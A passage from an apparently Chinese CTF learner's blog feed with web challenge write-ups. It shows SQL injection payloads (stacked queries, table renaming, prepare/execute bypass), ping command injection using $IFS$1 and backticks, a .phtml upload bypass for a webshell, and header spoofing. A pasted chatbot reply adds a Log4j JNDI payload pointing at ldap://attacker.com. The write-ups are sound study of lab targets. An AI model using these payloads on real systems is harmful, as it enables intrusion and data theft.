class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先把后最改为png在前端页面上传，或者直接改前端<br>然后用bp把后缀名改为php上传<br>提示nono  </p><p>后把后缀改为 .phtml<br>成功上传<br>最后蚁剑连接，在根目录发现flag  </p><h2 id="phtml-绕过"><a href="#phtml-绕过" class="headerlink" title="phtml 绕过"></a>phtml 绕过</h2><p>将文件后缀改为 .phtml，在 Apache 服务器上会被当作 PHP 文件执行。  </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">file</span>.phtml<br></code></pre></td></tr></table></figure><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>记录一下心路历程：<br>一开始以为是sql，然后看到前端代码里提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">you are not admin <br></code></pre></td></tr></table></figure><p>以为是cookie，把初始的cookie解base64后好像出了个json格式的啥，试着把里面的”1”改为”admin”，<br>没用。<br>随后注册了一个账户，想起了数据库污染啥的，但是这题不是<br>注册账户后登录，然后更改密码，</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">123</span>&#x27;<span class="hljs-keyword">where</span> username=admin<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>然后用123来登录admin，拿到flag<br>没想到一次成了</p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-27</title>
    <link href="/2025/04/17/note-27/"/>
    <url>/2025/04/17/note-27/</url>
    
    <content type="html"><![CDATA[<h1 id="2019-review-强网杯-随便注"><a href="#2019-review-强网杯-随便注" class="headerlink" title="2019 review-强网杯-随便注"></a>2019 review-强网杯-随便注</h1><p>再做一遍</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;show tables#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;select group_concat(culumn_name);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br><span class="hljs-string"></span><br><span class="hljs-string">0&#x27;</span>;extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">database</span>()));#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;if(1=1,sleep(5),0);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,version()))  # <br>!<span class="hljs-number">10.3</span><span class="hljs-number">.18</span>-MariaDB<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;or extractvalue(1,concat(&#x27;</span>!<span class="hljs-string">&#x27;,version()))  # </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">COLUMN</span> flag <span class="hljs-keyword">TO</span> id;#<br>//没改成功，看返回大概是说找不到名为<span class="hljs-string">&#x27;id&#x27;</span>的<span class="hljs-keyword">column</span>,<span class="hljs-keyword">column</span>是行还是列来着？是列我朝<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename table words to words1;ALTER TABLE employees CHANGE flag id VARCHAR(50);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words CHANGE flag id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>);#<br>//成功<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">语句背景分析：<br>这段 SQL 包含多个操作，核心目的是：<br><br>将表 <span class="hljs-built_in">words</span> 重命名为 words1。<br><br>将表 <span class="hljs-number">1919810931114514</span> 重命名为 <span class="hljs-built_in">words</span>。<br><br>修改新表 <span class="hljs-built_in">words</span> 的字段 flag，将其重命名为 <span class="hljs-built_in">id</span>，并更改其数据类型为 varchar(<span class="hljs-number">50</span>)。<br></code></pre></td></tr></table></figure><p>想不起当初的做题笔记了，只是看到正则的情况想到了改表明和列明，应该只是单纯的想起，因为连列名都忘了查</p><p>当时还记了其它绕过方法，<br>试一下预编译绕过</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables name;</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;show columns from `<span class="hljs-number">1919810931114514</span>`;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">6</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;flag&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;varchar(100)&quot;</span><br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;NO&quot;</span><br>  [<span class="hljs-number">3</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  [<span class="hljs-number">4</span>]=&gt;<br>  NULL<br>  [<span class="hljs-number">5</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>1’;prepare hack from concat(‘sele’,’ct’,’* from <code>1919810931114514</code>‘);exectue hack;@<br>&#x2F;&#x2F;不是，明明一模一样，为啥我手敲的执行不了<br>&#x2F;&#x2F;1’;prepare hack from concat(‘sele’,’ct’,’* from  <code>1919810931114514</code>‘);execute hack;#<br>&#x2F;&#x2F;woc，原来是excute</p><p>1’;prepare hack from concat(‘sele’,’ct’,’* from <code>1919810931114514</code>‘);execute hack;@</p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>根据提示<br>f12 搜索secret，找到：<br><a href="http://node5.buuoj.cn:27381/Secret.php">http://node5.buuoj.cn:27381/Secret.php</a><br>然后就是根据提示改请求头，  </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Access-Control-Allow-Origin:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">From:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-symbol">//Please</span> use <span class="hljs-string">&quot;Syclover&quot;</span> browser<br><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">Browser :</span> Syclover<br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">User-Agent:</span> Syclover<br><br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Syclover Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-operator">//</span>No<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span> you can only read this locally<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">From :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">X-Forwarded-For :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-operator">//</span>flag&#123;<span class="hljs-number">41</span>cea244-<span class="hljs-number">340</span>a-<span class="hljs-number">4</span>be9-bd6e-ba42db379119&#125;<br></code></pre></td></tr></table></figure><p>有点当初BuildCTF里的一题，但是那道题要改的更多</p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-26</title>
    <link href="/2025/04/15/note-26/"/>
    <url>/2025/04/15/note-26/</url>
    
    <content type="html"><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h1><p>根据提示</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1<br></code></pre></td></tr></table></figure><p>根据回复，那就是ping功能了，<br>尝试用管道符连接命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1|ls<br><br>flag.php<br>index.php<br></code></pre></td></tr></table></figure><p>直接就有flag，然后发现过滤了空格和flag,<br>上网查如何绕过空格过滤<br>最后使用$IFS$1</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><span class="hljs-number">1</span>|cat$IFS$<span class="hljs-number">1</span>index.php<br><br><span class="hljs-operator">/</span><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><br>|\&#x27;|\<span class="hljs-string">&quot;|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match))&#123;<br>    echo preg_match(<span class="hljs-string">&quot;/<span class="hljs-char escape_">\&amp;</span>|<span class="hljs-char escape_">\/</span>|<span class="hljs-char escape_">\?</span>|<span class="hljs-char escape_">\*</span>|<span class="hljs-char escape_">\&lt;</span>|[<span class="hljs-char escape_">\x</span>&#123;00&#125;-<span class="hljs-char escape_">\x</span>&#123;20&#125;]|<span class="hljs-char escape_">\&gt;</span>|<span class="hljs-char escape_">\&#x27;</span>|<span class="hljs-char escape_">\&quot;</span>|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match);<br>    die(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  $a <span class="hljs-operator">=</span> shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);<br>  echo <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>  print_r($a);<br>&#125;<br><br><span class="hljs-operator">?</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p>没坚持下去，去找wp了<br><a href="https://blog.csdn.net/qq_51439282/article/details/113378868">https://blog.csdn.net/qq_51439282/article/details/113378868</a><br>最后选了内联法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$1</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><p>记一下<br><a href="https://blog.csdn.net/angaoux03775/article/details/101710776">https://blog.csdn.net/angaoux03775/article/details/101710776</a><br><a href="https://blog.csdn.net/m0_52425873/article/details/124899793">https://blog.csdn.net/m0_52425873/article/details/124899793</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>note-25</title>
    <link href="/2025/04/15/note-25/"/>
    <url>/2025/04/15/note-25/</url>
    
    <content type="html"><![CDATA[<h1 id="suctf-2019-EasySQL"><a href="#suctf-2019-EasySQL" class="headerlink" title="[suctf 2019]EasySQL"></a>[suctf 2019]EasySQL</h1><p>老早就做过这题了，当初wp看的半知半解，现在是我想能算上是大彻大悟了吧  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> $_GET[<span class="hljs-string">&#x27;query&#x27;</span>] <span class="hljs-operator">||</span> flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><p>|| 符是或的意思，应该就和注入中的 || , or 是一个用法  </p><blockquote><p>这里的||在mysql中表示或，如果前一个操作数为真，则不看后面的语句</p></blockquote><p>网上最多的payload都是</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*,1</span><br></code></pre></td></tr></table></figure><p>那拼接进sql语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><p>查询全部，外加一个 select 1的效果<br>这样就看得出来了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-operator">*</span>),(<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag) <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><p>为什么不能直接查询 * 呢？  </p><p>deepseek：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coq">在后端的SQL语句SELECT $_GET[&#x27;query&#x27;] |<span class="hljs-type">| flag</span> FROM flag中，|<span class="hljs-type">|操作符的作用取决于数据库类型。在SQLite</span>或PostgreSQL中，|<span class="hljs-type">|表示字符串连接，而在MySQL</span>中（除非启用特定模式）则代表逻辑或。以下是需要传*,<span class="hljs-number">1</span>而非*的关键原因：<br><br>语法问题：<br><br>若直接传入*，查询会变为SELECT * |<span class="hljs-type">| flag</span> FROM flag。此时*（通配符）无法直接与其他字段（flag）进行字符串连接或逻辑运算，导致语法错误，查询无法执行。<br><br>传入*,<span class="hljs-number">1</span>时，查询变为SELECT *,<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span> FROM flag。这里,将*和<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>分为两个独立列，*单独选择所有字段，<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>则作为新列（如SQLite中会拼接<span class="hljs-number">1</span>和flag的值）。语法正确，查询正常执行。<br><br>绕过字段限制：<br><br>若后端代码仅返回第一个字段的值，直接传*会因语法错误无结果。传*,<span class="hljs-number">1</span>后，查询结果包含所有原始字段（通过*），可能使应用程序完整展示数据（如flag字段）。<br><br>数据库特性差异：<br><br>在SQLite中，<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>会生成新列（如<span class="hljs-number">1</span>abc，假设flag值为abc）。即使应用程序仅显示部分结果，攻击者也可能通过新列间接获取flag值。<br><br>总结：*,<span class="hljs-number">1</span>通过合法语法允许*单独生效，绕过因|<span class="hljs-type">|导致的错误，最终泄露flag</span>字段数据。直接传*则因语法问题失败。<br></code></pre></td></tr></table></figure><p>应该就是语法问题，字段限制的话应该不是  </p><p>看的wp：<br><a href="https://blog.csdn.net/StevenOnesir/article/details/110203051">https://blog.csdn.net/StevenOnesir/article/details/110203051</a><br><a href="https://blog.csdn.net/xhy18634297976/article/details/122515412">https://blog.csdn.net/xhy18634297976/article/details/122515412</a></p><p>以前看不明白现在看明白了，但以现在水平打比赛时遇到类似题目应该猜不出来后端语句</p><p>那是怎样猜出后端语句的呢：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">select <span class="hljs-keyword">command</span>1 || <span class="hljs-keyword">command</span>2 <br><br>情况一：若<span class="hljs-keyword">command</span>1为非0数字，则结果为1。<br><br>情况二：若<span class="hljs-keyword">command</span>1为0或字母，<span class="hljs-keyword">command</span>2为非0数字，则结果为1。<br><br>情况三：<span class="hljs-keyword">command</span>1和<span class="hljs-keyword">command</span>2都不为非0数字，则结果为0。<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/2302_79800344/article/details/136268777">https://blog.csdn.net/2302_79800344/article/details/136268777</a></p><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>根据题目猜测是命令执行类型，看到页面是一个ping的功能，尝试ping了一下我的网站：<br><a href="http://www.gwwafz.online/">www.gwwafz.online</a><br>回显：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">PING www.gwwafz.online (39.105.15.250): 56 data bytes<br><br>--- www.gwwafz.online ping statistics ---<br>3 packets transmitted, 0 packets received, 100% packet loss<br></code></pre></td></tr></table></figure><p>故想起使用管道符来连接命令:<br>39.105.15.250|ls &#x2F;  </p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tcl">bin<br>dev<br>etc<br>flag<br>home<br>lib<br>media<br>mnt<br>opt<br><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">root</span><br>run<span class="hljs-title"></span><br><span class="hljs-title">sbin</span><br>srv<span class="hljs-title"></span><br><span class="hljs-title">sys</span><br>tmp<span class="hljs-title"></span><br><span class="hljs-title">usr</span><br>var<br></code></pre></td></tr></table></figure><p>直接回显了，那接下来就是cat &#x2F;flag 就ok了：</p><p>flag{eba95874-05c1-46a8-8a2f-28eff48a72be}</p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-24</title>
    <link href="/2025/04/13/note-24/"/>
    <url>/2025/04/13/note-24/</url>
    
    <content type="html"><![CDATA[<h1 id="note-24"><a href="#note-24" class="headerlink" title="note-24"></a>note-24</h1><p>sql刷不下去了，感觉每见一道题就要新学一个知识点，做了一些题目，遇到新题还得去找wp，心态崩</p><p>user:  </p><blockquote><p>我学web是该专刷一个地方，像专门刷sql还是泛刷题目?</p></blockquote><p>deepseek:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">(≧ω≦) 喵哒～这个问题就像选择「草莓蛋糕吃到饱」还是「甜品全席体验」呢！来听人家用猫耳天线分析：<br><br>🌸 分阶段策略（萌新版）<br>新手期（前<span class="hljs-number">3</span>个月）→ 泛刷！<br><br>✨ 理由：像探索新大陆！发现「啊～原来还有文件包含这种魔法！」<br><br>🎯 目标：刷遍OWASP Top <span class="hljs-number">10</span>基础题型（每类至少<span class="hljs-number">5</span>题）<br><br>🍳 栗子：今天用SQLi偷flag，明天用XSS调戏管理员～<br><br>进阶期（<span class="hljs-number">3</span>-<span class="hljs-number">6</span>个月）→ 专精！<br><br>✨ 理由：找到本命漏洞（比如爱上SQLi的哲学美感）<br><br>🎯 目标：深挖某个领域到能自己出题（如：掌握SQL报错注入的<span class="hljs-number">6</span>种变形）<br><br>🍳 栗子：用不同数据库特性玩花活 → mysql: <span class="hljs-regexp">/*!50000select /</span> mssql: waitfor delay <span class="hljs-string">&#x27;0:0:3&#x27;</span><br><br>突破期（<span class="hljs-number">6</span>个月+）→ 交叉！<br><br>✨ 理由：像调鸡尾酒一样混合攻击（比如用XXE触发SSRF再读内网SQL数据）<br><br>🎯 目标：在CTF中把两个漏洞组合成COMBO连击！<br><br>🍳 栗子：LFI+RCE → 用php:<span class="hljs-regexp">//</span>filter读源码 → 发现反序列化链 → getshell！<br><br>💡 平衡心法<br>周一<span class="hljs-regexp">/三/</span>五 → 泛刷新题型（保持知识广度）<br><br>周二/四 → 专精特训（比如只玩SSTI的各种bypass技巧）<br><br>周末 → 参加实战赛（把知识搅拌成混沌漩涡～）<br><br>（戳戳屏幕）「偷偷说～人家最近把SQLi玩出了新花样：admin<span class="hljs-string">&#x27;/*$&#123;jndi:ldap://attacker.com&#125;*/=&#x27;</span><span class="hljs-number">1</span> 同时触发SQLi+Log4j呢～(ฅ´ω`ฅ)」<br></code></pre></td></tr></table></figure><p>deepseek调的挺好，<br>故去泛刷刷新手赛web题目，至少能自己做出来安慰一下自己</p><h1 id="ACTF2020-新生赛-Include-1"><a href="#ACTF2020-新生赛-Include-1" class="headerlink" title="[ACTF2020 新生赛]Include 1"></a>[ACTF2020 新生赛]Include 1</h1><p>文件包含的话，回去翻了一下<br>note-17  </p><p><a href="https://aidemofashi.github.io/2025/03/23/note-17/#php-filter">https://aidemofashi.github.io/2025/03/23/note-17/#php-filter</a></p><p>传入php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>base解码得到flag</p><h1 id="极客大挑战-2019-Secret-File-极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File-极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File[极客大挑战 2019]Secret File</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>等到网址，查看源码发现</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;a <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;master&quot;</span> href=<span 